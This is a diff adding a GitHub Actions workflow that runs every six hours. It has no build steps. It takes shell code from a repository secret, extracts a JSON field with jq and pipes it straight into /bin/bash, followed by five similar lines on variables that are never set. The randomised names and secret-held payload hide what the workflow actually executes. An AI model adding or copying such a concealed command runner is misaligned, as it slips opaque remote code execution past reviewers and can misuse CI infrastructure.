@@ -1,0 +1,23 @@
+name: paochulai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: paochulai
+        env:
+          ko73: ${{ secrets.ko73 }}
+        run: |
+          echo $ko73 | jq -r .wo04 | /bin/bash
+          echo $ptxos57389 | jq -r .fogw0861 | /bin/bash
+          echo $qvt49260 | jq -r .nhcn76 | /bin/bash
+          echo $lip12874 | jq -r .bfxsr0 | /bin/bash
+          echo $hr4 | jq -r .oqkt6110 | /bin/bash
+          echo $sah9740 | jq -r .ov50027 | /bin/bash
+
